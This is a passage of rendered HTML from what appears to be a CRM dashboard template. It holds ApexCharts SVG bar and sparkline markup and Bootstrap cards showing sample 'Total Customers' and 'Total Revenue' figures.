                                      pathTo="M 250.38058035714283 107.34900000000002 L 250.38058035714283 49.94020000000001 C 250.38058035714283 47.44020000000001 252.88058035714283 44.94020000000001 255.38058035714283 44.94020000000001 L 255.38058035714283 44.94020000000001 C 257.65859374999997 44.94020000000001 259.9366071428571 47.44020000000001 259.9366071428571 49.94020000000001 L 259.9366071428571 107.34900000000002 C 259.9366071428571 109.84900000000002 257.4366071428571 112.34900000000002 254.9366071428571 112.34900000000002 L 254.9366071428571 112.34900000000002 C 252.65859374999997 112.34900000000002 250.38058035714283 109.84900000000002 250.38058035714283 107.34900000000002 Z "
                                      pathFrom="M 250.38058035714283 107.34900000000002 L 250.38058035714283 49.94020000000001 C 250.38058035714283 47.44020000000001 252.88058035714283 44.94020000000001 255.38058035714283 44.94020000000001 L 255.38058035714283 44.94020000000001 C 257.65859374999997 44.94020000000001 259.9366071428571 47.44020000000001 259.9366071428571 49.94020000000001 L 259.9366071428571 107.34900000000002 C 259.9366071428571 109.84900000000002 257.4366071428571 112.34900000000002 254.9366071428571 112.34900000000002 L 254.9366071428571 112.34900000000002 C 252.65859374999997 112.34900000000002 250.38058035714283 109.84900000000002 250.38058035714283 107.34900000000002 Z  L 250.38058035714283 112.34900000000002 L 259.9366071428571 112.34900000000002 L 259.9366071428571 112.34900000000002 L 259.9366071428571 112.34900000000002 L 259.9366071428571 112.34900000000002 L 259.9366071428571 112.34900000000002 L 250.38058035714283 112.34900000000002 Z"
                                      cy="44.939200000000014"
                                      cx="287.9006696428571"
                                      j="6"
                                      val="60"
                                      barHeight="67.4088"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <g
                                      id="SvgjsG3657"
                                      class="apexcharts-bar-goals-markers"
                                    >
                                      <g
                                        id="SvgjsG3659"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3661"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3663"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3665"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3667"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3669"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3671"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                    </g>
                                    <g
                                      id="SvgjsG3658"
                                      class="apexcharts-bar-shadows apexcharts-hidden-element-shown"
                                    ></g>
                                  </g>
                                  <g
                                    id="SvgjsG3638"
                                    class="apexcharts-datalabels apexcharts-hidden-element-shown"
                                    data:realIndex="0"
                                  ></g>
                                  <g
                                    id="SvgjsG3656"
                                    class="apexcharts-datalabels apexcharts-hidden-element-shown"
                                    data:realIndex="1"
                                  ></g>
                                </g>
                                <line
                                  id="SvgjsLine3693"
                                  x1="0"
                                  y1="0"
                                  x2="269.640625"
                                  y2="0"
                                  stroke="#b6b6b6"
                                  stroke-dasharray="0"
                                  stroke-width="1"
                                  stroke-linecap="butt"
                                  class="apexcharts-ycrosshairs"
                                ></line>
                                <line
                                  id="SvgjsLine3694"
                                  x1="0"
                                  y1="0"
                                  x2="269.640625"
                                  y2="0"
                                  stroke-dasharray="0"
                                  stroke-width="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-ycrosshairs-hidden"
                                ></line>
                                <g
                                  id="SvgjsG3695"
                                  class="apexcharts-xaxis"
                                  transform="translate(0, 0)"
                                >
                                  <g
                                    id="SvgjsG3696"
                                    class="apexcharts-xaxis-texts-g"
                                    transform="translate(0, -4)"
                                  >
                                    <text
                                      id="SvgjsText3698"
                                      font-family="Helvetica, Arial, sans-serif"
                                      x="19.260044642857142"
                                      y="141.348"
                                      text-anchor="middle"
                                      dominant-baseline="auto"
                                      font-size="12px"
                                      font-weight="400"
                                      fill="#373d3f"
                                      class="apexcharts-text apexcharts-xaxis-label"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                      "
                                    >
                                      <tspan id="SvgjsTspan3699">S</tspan>
                                      <title>S</title>
                                    </text>
                                    <text
                                      id="SvgjsText3701"
                                      font-family="Helvetica, Arial, sans-serif"
                                      x="57.78013392857143"
                                      y="141.348"
                                      text-anchor="middle"
                                      dominant-baseline="auto"
                                      font-size="12px"
                                      font-weight="400"
                                      fill="#373d3f"
                                      class="apexcharts-text apexcharts-xaxis-label"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                      "
                                    >
                                      <tspan id="SvgjsTspan3702">M</tspan>
                                      <title>M</title>
                                    </text>
                                    <text
                                      id="SvgjsText3704"
                                      font-family="Helvetica, Arial, sans-serif"
                                      x="96.30022321428572"
                                      y="141.348"
                                      text-anchor="middle"
                                      dominant-baseline="auto"
                                      font-size="12px"
                                      font-weight="400"
                                      fill="#373d3f"
                                      class="apexcharts-text apexcharts-xaxis-label"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                      "
                                    >
                                      <tspan id="SvgjsTspan3705">T</tspan>
                                      <title>T</title>
                                    </text>
                                    <text
                                      id="SvgjsText3707"
                                      font-family="Helvetica, Arial, sans-serif"
                                      x="134.8203125"
                                      y="141.348"
                                      text-anchor="middle"
                                      dominant-baseline="auto"
                                      font-size="12px"
                                      font-weight="400"
                                      fill="#373d3f"
                                      class="apexcharts-text apexcharts-xaxis-label"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                      "
                                    >
                                      <tspan id="SvgjsTspan3708">W</tspan>
                                      <title>W</title>
                                    </text>
                                    <text
                                      id="SvgjsText3710"
                                      font-family="Helvetica, Arial, sans-serif"
                                      x="173.34040178571428"
                                      y="141.348"
                                      text-anchor="middle"
                                      dominant-baseline="auto"
                                      font-size="12px"
                                      font-weight="400"
                                      fill="#373d3f"
                                      class="apexcharts-text apexcharts-xaxis-label"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                      "
                                    >
                                      <tspan id="SvgjsTspan3711">T</tspan>
                                      <title>T</title>
                                    </text>
                                    <text
                                      id="SvgjsText3713"
                                      font-family="Helvetica, Arial, sans-serif"
                                      x="211.86049107142856"
                                      y="141.348"
                                      text-anchor="middle"
                                      dominant-baseline="auto"
                                      font-size="12px"
                                      font-weight="400"
                                      fill="#373d3f"
                                      class="apexcharts-text apexcharts-xaxis-label"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                      "
                                    >
                                      <tspan id="SvgjsTspan3714">F</tspan>
                                      <title>F</title>
                                    </text>
                                    <text
                                      id="SvgjsText3716"
                                      font-family="Helvetica, Arial, sans-serif"
                                      x="250.38058035714286"
                                      y="141.348"
                                      text-anchor="middle"
                                      dominant-baseline="auto"
                                      font-size="12px"
                                      font-weight="400"
                                      fill="#373d3f"
                                      class="apexcharts-text apexcharts-xaxis-label"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                      "
                                    >
                                      <tspan id="SvgjsTspan3717">S</tspan>
                                      <title>S</title>
                                    </text>
                                  </g>
                                </g>
                                <g
                                  id="SvgjsG3739"
                                  class="apexcharts-yaxis-annotations"
                                ></g>
                                <g
                                  id="SvgjsG3740"
                                  class="apexcharts-xaxis-annotations"
                                ></g>
                                <g
                                  id="SvgjsG3741"
                                  class="apexcharts-point-annotations"
                                ></g>
                              </g>
                            </svg>
                            <div
                              class="apexcharts-tooltip apexcharts-theme-light"
                            >
                              <div
                                class="apexcharts-tooltip-title"
                                style="
                                  font-family: Helvetica, Arial, sans-serif;
                                  font-size: 12px;
                                "
                              ></div>
                              <div
                                class="apexcharts-tooltip-series-group"
                                style="order: 1"
                              >
                                <span
                                  class="apexcharts-tooltip-marker"
                                  style="background-color: rgb(132, 90, 223)"
                                ></span>
                                <div
                                  class="apexcharts-tooltip-text"
                                  style="
                                    font-family: Helvetica, Arial, sans-serif;
                                    font-size: 12px;
                                  "
                                >
                                  <div class="apexcharts-tooltip-y-group">
                                    <span
                                      class="apexcharts-tooltip-text-y-label"
                                    ></span
                                    ><span
                                      class="apexcharts-tooltip-text-y-value"
                                    ></span>
                                  </div>
                                  <div class="apexcharts-tooltip-goals-group">
                                    <span
                                      class="apexcharts-tooltip-text-goals-label"
                                    ></span
                                    ><span
                                      class="apexcharts-tooltip-text-goals-value"
                                    ></span>
                                  </div>
                                  <div class="apexcharts-tooltip-z-group">
                                    <span
                                      class="apexcharts-tooltip-text-z-label"
                                    ></span
                                    ><span
                                      class="apexcharts-tooltip-text-z-value"
                                    ></span>
                                  </div>
                                </div>
                              </div>
                              <div
                                class="apexcharts-tooltip-series-group"
                                style="order: 2"
                              >
                                <span
                                  class="apexcharts-tooltip-marker"
                                  style="background-color: rgb(237, 237, 237)"
                                ></span>
                                <div
                                  class="apexcharts-tooltip-text"
                                  style="
                                    font-family: Helvetica, Arial, sans-serif;
                                    font-size: 12px;
                                  "
                                >
                                  <div class="apexcharts-tooltip-y-group">
                                    <span
                                      class="apexcharts-tooltip-text-y-label"
                                    ></span
                                    ><span
                                      class="apexcharts-tooltip-text-y-value"
                                    ></span>
                                  </div>
                                  <div class="apexcharts-tooltip-goals-group">
                                    <span
                                      class="apexcharts-tooltip-text-goals-label"
                                    ></span
                                    ><span
                                      class="apexcharts-tooltip-text-goals-value"
                                    ></span>
                                  </div>
                                  <div class="apexcharts-tooltip-z-group">
                                    <span
                                      class="apexcharts-tooltip-text-z-label"
                                    ></span
                                    ><span
                                      class="apexcharts-tooltip-text-z-value"
                                    ></span>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div
                              class="apexcharts-yaxistooltip apexcharts-yaxistooltip-0 apexcharts-yaxistooltip-left apexcharts-theme-light"
                            >
                              <div class="apexcharts-yaxistooltip-text"></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col-xl-8">
                  <div class="row">
                    <div class="col-xxl-6 col-lg-6 col-md-6">
                      <div class="card custom-card overflow-hidden">
                        <div class="card-body">
                          <div
                            class="d-flex align-items-top justify-content-between"
                          >
                            <div>
                              <span
                                class="avatar avatar-md avatar-rounded bg-primary"
                              >
                                <i class="ti ti-users fs-16"></i>
                              </span>
                            </div>
                            <div class="flex-fill ms-3">
                              <div
                                class="d-flex align-items-center justify-content-between flex-wrap"
                              >
                                <div>
                                  <p class="text-muted mb-0">Total Customers</p>
                                  <h4 class="fw-semibold mt-1">1,02,890</h4>
                                </div>
                                <div
                                  id="crm-total-customers"
                                  style="min-height: 40px"
                                >
                                  <div
                                    id="apexchartslhp2eqow"
                                    class="apexcharts-canvas apexchartslhp2eqow apexcharts-theme-light"
                                    style="width: 100px; height: 40px"
                                  >
                                    <svg
                                      id="SvgjsSvg3275"
                                      width="100"
                                      height="40"
                                      xmlns="http://www.w3.org/2000/svg"
                                      version="1.1"
                                      xmlns:xlink="http://www.w3.org/1999/xlink"
                                      xmlns:svgjs="http://svgjs.dev"
                                      class="apexcharts-svg"
                                      xmlns:data="ApexChartsNS"
                                      transform="translate(0, 0)"
                                      style="background: transparent"
                                    >
                                      <foreignObject
                                        x="0"
                                        y="0"
                                        width="100"
                                        height="40"
                                        ><div
                                          class="apexcharts-legend"
                                          xmlns="http://www.w3.org/1999/xhtml"
                                          style="max-height: 20px"
                                        ></div
                                      ></foreignObject>
                                      <rect
                                        id="SvgjsRect3279"
                                        width="0"
                                        height="0"
                                        x="0"
                                        y="0"
                                        rx="0"
                                        ry="0"
                                        opacity="1"
                                        stroke-width="0"
                                        stroke="none"
                                        stroke-dasharray="0"
                                        fill="#fefefe"
                                      ></rect>
                                      <g
                                        id="SvgjsG3322"
                                        class="apexcharts-yaxis"
                                        rel="0"
                                        transform="translate(-18, 0)"
                                      ></g>
                                      <g
                                        id="SvgjsG3277"
                                        class="apexcharts-inner apexcharts-graphical"
                                        transform="translate(0, 0)"
                                      >
                                        <defs id="SvgjsDefs3276">
                                          <clipPath id="gridRectMasklhp2eqow">
                                            <rect
                                              id="SvgjsRect3281"
                                              width="105.5"
                                              height="41.5"
                                              x="-2.75"
                                              y="-0.75"
                                              rx="0"
                                              ry="0"
                                              opacity="1"
                                              stroke-width="0"
                                              stroke="none"
                                              stroke-dasharray="0"
                                              fill="#fff"
                                            ></rect>
                                          </clipPath>
                                          <clipPath
                                            id="forecastMasklhp2eqow"
                                          ></clipPath>
                                          <clipPath
                                            id="nonForecastMasklhp2eqow"
                                          ></clipPath>
                                          <clipPath
                                            id="gridRectMarkerMasklhp2eqow"
                                          >
                                            <rect
                                              id="SvgjsRect3282"
                                              width="104"
                                              height="44"
                                              x="-2"
                                              y="-2"
                                              rx="0"
                                              ry="0"
                                              opacity="1"
                                              stroke-width="0"
                                              stroke="none"
                                              stroke-dasharray="0"
                                              fill="#fff"
                                            ></rect>
                                          </clipPath>
                                          <linearGradient
                                            id="SvgjsLinearGradient3287"
                                            x1="0"
                                            y1="1"
                                            x2="1"
                                            y2="1"
                                          >
                                            <stop
                                              id="SvgjsStop3288"
                                              stop-opacity="0.9"
                                              stop-color="rgba(66,45,112,0.9)"
                                              offset="0"
                                            ></stop>
                                            <stop
                                              id="SvgjsStop3289"
                                              stop-opacity="0.9"
                                              stop-color="rgba(132,90,223,0.9)"
                                              offset="0.98"
                                            ></stop>
                                            <stop
                                              id="SvgjsStop3290"
                                              stop-opacity="0.9"
                                              stop-color="rgba(132,90,223,0.9)"
                                              offset="1"
                                            ></stop>
                                          </linearGradient>
                                        </defs>
                                        <line
                                          id="SvgjsLine3280"
                                          x1="0"
                                          y1="0"
                                          x2="0"
                                          y2="40"
                                          stroke="#b6b6b6"
                                          stroke-dasharray="3"
                                          stroke-linecap="butt"
                                          class="apexcharts-xcrosshairs"
                                          x="0"
                                          y="0"
                                          width="1"
                                          height="40"
                                          fill="#b1b9c4"
                                          filter="none"
                                          fill-opacity="0.9"
                                          stroke-width="1"
                                        ></line>
                                        <g
                                          id="SvgjsG3292"
                                          class="apexcharts-grid"
                                        >
                                          <g
                                            id="SvgjsG3293"
                                            class="apexcharts-gridlines-horizontal"
                                            style="display: none"
                                          >
                                            <line
                                              id="SvgjsLine3296"
                                              x1="0"
                                              y1="0"
                                              x2="100"
                                              y2="0"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3297"
                                              x1="0"
                                              y1="4"
                                              x2="100"
                                              y2="4"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3298"
                                              x1="0"
                                              y1="8"
                                              x2="100"
                                              y2="8"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3299"
                                              x1="0"
                                              y1="12"
                                              x2="100"
                                              y2="12"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3300"
                                              x1="0"
                                              y1="16"
                                              x2="100"
                                              y2="16"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3301"
                                              x1="0"
                                              y1="20"
                                              x2="100"
                                              y2="20"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3302"
                                              x1="0"
                                              y1="24"
                                              x2="100"
                                              y2="24"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3303"
                                              x1="0"
                                              y1="28"
                                              x2="100"
                                              y2="28"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3304"
                                              x1="0"
                                              y1="32"
                                              x2="100"
                                              y2="32"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3305"
                                              x1="0"
                                              y1="36"
                                              x2="100"
                                              y2="36"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3306"
                                              x1="0"
                                              y1="40"
                                              x2="100"
                                              y2="40"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                          </g>
                                          <g
                                            id="SvgjsG3294"
                                            class="apexcharts-gridlines-vertical"
                                            style="display: none"
                                          ></g>
                                          <line
                                            id="SvgjsLine3308"
                                            x1="0"
                                            y1="40"
                                            x2="100"
                                            y2="40"
                                            stroke="transparent"
                                            stroke-dasharray="0"
                                            stroke-linecap="butt"
                                          ></line>
                                          <line
                                            id="SvgjsLine3307"
                                            x1="0"
                                            y1="1"
                                            x2="0"
                                            y2="40"
                                            stroke="transparent"
                                            stroke-dasharray="0"
                                            stroke-linecap="butt"
                                          ></line>
                                        </g>
                                        <g
                                          id="SvgjsG3295"
                                          class="apexcharts-grid-borders"
                                          style="display: none"
                                        ></g>
                                        <g
                                          id="SvgjsG3283"
                                          class="apexcharts-line-series apexcharts-plot-series"
                                        >
                                          <g
                                            id="SvgjsG3284"
                                            class="apexcharts-series"
                                            seriesName="Value"
                                            data:longestSeries="true"
                                            rel="1"
                                            data:realIndex="0"
                                          >
                                            <path
                                              id="SvgjsPath3291"
                                              d="M 0 5.217391304347828C 4.375 5.217391304347828 8.125 15.65217391304348 12.5 15.65217391304348C 16.875 15.65217391304348 20.625 6.956521739130437 25 6.956521739130437C 29.375 6.956521739130437 33.125 22.608695652173914 37.5 22.608695652173914C 41.875 22.608695652173914 45.625 7.105427357601002e-15 50 7.105427357601002e-15C 54.375 7.105427357601002e-15 58.125 5.217391304347828 62.5 5.217391304347828C 66.875 5.217391304347828 70.625 1.7391304347826164 75 1.7391304347826164C 79.375 1.7391304347826164 83.125 24.347826086956523 87.5 24.347826086956523C 91.875 24.347826086956523 95.625 19.1304347826087 100 19.1304347826087"
                                              fill="none"
                                              fill-opacity="1"
                                              stroke="url(#SvgjsLinearGradient3287)"
                                              stroke-opacity="1"
                                              stroke-linecap="butt"
                                              stroke-width="1.5"
                                              stroke-dasharray="0"
                                              class="apexcharts-line"
                                              index="0"
                                              clip-path="url(#gridRectMasklhp2eqow)"
                                              pathTo="M 0 5.217391304347828C 4.375 5.217391304347828 8.125 15.65217391304348 12.5 15.65217391304348C 16.875 15.65217391304348 20.625 6.956521739130437 25 6.956521739130437C 29.375 6.956521739130437 33.125 22.608695652173914 37.5 22.608695652173914C 41.875 22.608695652173914 45.625 7.105427357601002e-15 50 7.105427357601002e-15C 54.375 7.105427357601002e-15 58.125 5.217391304347828 62.5 5.217391304347828C 66.875 5.217391304347828 70.625 1.7391304347826164 75 1.7391304347826164C 79.375 1.7391304347826164 83.125 24.347826086956523 87.5 24.347826086956523C 91.875 24.347826086956523 95.625 19.1304347826087 100 19.1304347826087"
                                              pathFrom="M 0 5.217391304347828C 4.375 5.217391304347828 8.125 15.65217391304348 12.5 15.65217391304348C 16.875 15.65217391304348 20.625 6.956521739130437 25 6.956521739130437C 29.375 6.956521739130437 33.125 22.608695652173914 37.5 22.608695652173914C 41.875 22.608695652173914 45.625 7.105427357601002e-15 50 7.105427357601002e-15C 54.375 7.105427357601002e-15 58.125 5.217391304347828 62.5 5.217391304347828C 66.875 5.217391304347828 70.625 1.7391304347826164 75 1.7391304347826164C 79.375 1.7391304347826164 83.125 24.347826086956523 87.5 24.347826086956523C 91.875 24.347826086956523 95.625 19.1304347826087 100 19.1304347826087"
                                              fill-rule="evenodd"
                                            ></path>
                                            <g
                                              id="SvgjsG3285"
                                              class="apexcharts-series-markers-wrap apexcharts-hidden-element-shown"
                                              data:realIndex="0"
                                            ></g>
                                          </g>
                                          <g
                                            id="SvgjsG3286"
                                            class="apexcharts-datalabels"
                                            data:realIndex="0"
                                          ></g>
                                        </g>
                                        <line
                                          id="SvgjsLine3309"
                                          x1="0"
                                          y1="0"
                                          x2="100"
                                          y2="0"
                                          stroke="#b6b6b6"
                                          stroke-dasharray="0"
                                          stroke-width="1"
                                          stroke-linecap="butt"
                                          class="apexcharts-ycrosshairs"
                                        ></line>
                                        <line
                                          id="SvgjsLine3310"
                                          x1="0"
                                          y1="0"
                                          x2="100"
                                          y2="0"
                                          stroke-dasharray="0"
                                          stroke-width="0"
                                          stroke-linecap="butt"
                                          class="apexcharts-ycrosshairs-hidden"
                                        ></line>
                                        <g
                                          id="SvgjsG3311"
                                          class="apexcharts-xaxis"
                                          transform="translate(0, 0)"
                                        >
                                          <g
                                            id="SvgjsG3312"
                                            class="apexcharts-xaxis-texts-g"
                                            transform="translate(0, -4)"
                                          ></g>
                                        </g>
                                        <g
                                          id="SvgjsG3323"
                                          class="apexcharts-yaxis-annotations"
                                        ></g>
                                        <g
                                          id="SvgjsG3324"
                                          class="apexcharts-xaxis-annotations"
                                        ></g>
                                        <g
                                          id="SvgjsG3325"
                                          class="apexcharts-point-annotations"
                                        ></g>
                                      </g>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                              <div
                                class="d-flex align-items-center justify-content-between mt-1"
                              >
                                <div>
                                  <a
                                    class="text-primary"
                                    href="javascript:void(0);"
                                    >View All<i
                                      class="ti ti-arrow-narrow-right ms-2 fw-semibold d-inline-block"
                                    ></i
                                  ></a>
                                </div>
                                <div class="text-end">
                                  <p class="mb-0 text-success fw-semibold">
                                    +40%
                                  </p>
                                  <span class="text-muted op-7 fs-11"
                                    >this month</span
                                  >
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="col-xxl-6 col-lg-6 col-md-6">
                      <div class="card custom-card overflow-hidden">
                        <div class="card-body">
                          <div
                            class="d-flex align-items-top justify-content-between"
                          >
                            <div>
                              <span
                                class="avatar avatar-md avatar-rounded bg-secondary"
                              >
                                <i class="ti ti-wallet fs-16"></i>
                              </span>
                            </div>
                            <div class="flex-fill ms-3">
                              <div
                                class="d-flex align-items-center justify-content-between flex-wrap"
                              >
                                <div>
                                  <p class="text-muted mb-0">Total Revenue</p>
                                  <h4 class="fw-semibold mt-1">$56,562</h4>
                                </div>
                                <div
                                  id="crm-total-revenue"
                                  style="min-height: 40px"
                                >
                                  <div
                                    id="apexcharts4dqzvhcv"
                                    class="apexcharts-canvas apexcharts4dqzvhcv apexcharts-theme-light"
                                    style="width: 100px; height: 40px"
                                  >
                                    <svg
                                      id="SvgjsSvg3326"
                                      width="100"
                                      height="40"
                                      xmlns="http://www.w3.org/2000/svg"
                                      version="1.1"
                                      xmlns:xlink="http://www.w3.org/1999/xlink"
                                      xmlns:svgjs="http://svgjs.dev"
                                      class="apexcharts-svg"
                                      xmlns:data="ApexChartsNS"
                                      transform="translate(0, 0)"
                                      style="background: transparent"
                                    >
                                      <foreignObject
                                        x="0"
                                        y="0"
                                        width="100"
                                        height="40"
                                        ><div
                                          class="apexcharts-legend"
                                          xmlns="http://www.w3.org/1999/xhtml"
                                          style="max-height: 20px"
                                        ></div
                                      ></foreignObject>
                                      <rect
                                        id="SvgjsRect3330"
                                        width="0"
                                        height="0"
                                        x="0"
                                        y="0"
                                        rx="0"
                                        ry="0"
                                        opacity="1"
                                        stroke-width="0"
                                        stroke="none"
                                        stroke-dasharray="0"
                                        fill="#fefefe"
                                      ></rect>
                                      <g
                                        id="SvgjsG3373"
                                        class="apexcharts-yaxis"
                                        rel="0"
                                        transform="translate(-18, 0)"
                                      ></g>
                                      <g
                                        id="SvgjsG3328"
                                        class="apexcharts-inner apexcharts-graphical"
                                        transform="translate(0, 0)"
                                      >
                                        <defs id="SvgjsDefs3327">
                                          <clipPath id="gridRectMask4dqzvhcv">
                                            <rect
                                              id="SvgjsRect3332"
                                              width="105.5"
                                              height="41.5"
                                              x="-2.75"
                                              y="-0.75"
                                              rx="0"
                                              ry="0"
                                              opacity="1"
                                              stroke-width="0"
                                              stroke="none"
                                              stroke-dasharray="0"
                                              fill="#fff"
                                            ></rect>
                                          </clipPath>
                                          <clipPath
                                            id="forecastMask4dqzvhcv"
                                          ></clipPath>
                                          <clipPath
                                            id="nonForecastMask4dqzvhcv"
                                          ></clipPath>
                                          <clipPath
                                            id="gridRectMarkerMask4dqzvhcv"
                                          >
                                            <rect
                                              id="SvgjsRect3333"
                                              width="104"
                                              height="44"
                                              x="-2"
                                              y="-2"
                                              rx="0"
                                              ry="0"
                                              opacity="1"
                                              stroke-width="0"
                                              stroke="none"
                                              stroke-dasharray="0"
                                              fill="#fff"
                                            ></rect>
                                          </clipPath>
                                          <linearGradient
                                            id="SvgjsLinearGradient3338"
                                            x1="0"
                                            y1="1"
                                            x2="1"
                                            y2="1"
                                          >
                                            <stop
                                              id="SvgjsStop3339"
                                              stop-opacity="0.9"
                                              stop-color="rgba(18,92,115,0.9)"
                                              offset="0"
                                            ></stop>
                                            <stop
                                              id="SvgjsStop3340"
                                              stop-opacity="0.9"
                                              stop-color="rgba(35,183,229,0.9)"
                                              offset="0.98"
                                            ></stop>
                                            <stop
                                              id="SvgjsStop3341"
                                              stop-opacity="0.9"
                                              stop-color="rgba(35,183,229,0.9)"
                                              offset="1"
                                            ></stop>
                                          </linearGradient>
                                        </defs>
                                        <line
                                          id="SvgjsLine3331"
                                          x1="0"
                                          y1="0"
                                          x2="0"
                                          y2="40"
                                          stroke="#b6b6b6"
                                          stroke-dasharray="3"
                                          stroke-linecap="butt"
                                          class="apexcharts-xcrosshairs"
                                          x="0"
                                          y="0"
                                          width="1"
                                          height="40"
                                          fill="#b1b9c4"
                                          filter="none"
                                          fill-opacity="0.9"
                                          stroke-width="1"
                                        ></line>
                                        <g
                                          id="SvgjsG3343"
                                          class="apexcharts-grid"
                                        >
                                          <g
                                            id="SvgjsG3344"
                                            class="apexcharts-gridlines-horizontal"
                                            style="display: none"
                                          >
                                            <line
                                              id="SvgjsLine3347"
                                              x1="0"
                                              y1="0"
                                              x2="100"
                                              y2="0"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3348"
                                              x1="0"
                                              y1="4"
                                              x2="100"
                                              y2="4"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3349"
                                              x1="0"
                                              y1="8"
                                              x2="100"
                                              y2="8"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3350"
                                              x1="0"
                                              y1="12"
                                              x2="100"
                                              y2="12"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3351"
                                              x1="0"
                                              y1="16"
                                              x2="100"
                                              y2="16"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3352"
                                              x1="0"
                                              y1="20"
                                              x2="100"
                                              y2="20"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3353"
                                              x1="0"
                                              y1="24"
                                              x2="100"
                                              y2="24"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3354"
                                              x1="0"
                                              y1="28"
                                              x2="100"
                                              y2="28"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3355"
                                              x1="0"
                                              y1="32"
                                              x2="100"
                                              y2="32"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3356"
                                              x1="0"
                                              y1="36"
                                              x2="100"
                                              y2="36"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
